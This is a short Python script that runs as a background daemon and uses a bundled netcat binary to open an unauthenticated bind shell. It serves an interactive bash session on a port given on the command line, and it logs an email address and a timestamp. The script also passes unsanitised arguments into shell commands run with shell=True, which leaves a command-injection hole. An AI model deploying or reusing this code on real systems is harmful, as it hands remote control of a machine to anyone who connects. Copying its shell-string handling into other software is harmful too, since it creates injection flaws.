from daemonize import Daemonize
import sys,time,os
from subprocess import Popen,PIPE
from socket import *
aname = "bbb_shell_"+sys.argv[2]+"_"+sys.argv[1]
pid = "/tmp/"+aname

def main():
    email= sys.argv[2]
    port = sys.argv[1]
    Popen("chmod +x "+os.path.dirname(os.path.realpath(__file__))+"/netcat", shell=True)
    Popen("nohup echo \""+email+"("+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+")\" && nohup "+os.path.dirname(os.path.realpath(__file__))+"/netcat -l -p "+port+" -e \"/bin/bash -i\" & ", shell=True)

daemon = Daemonize(app=aname, pid=pid, action=main)
daemon.start()
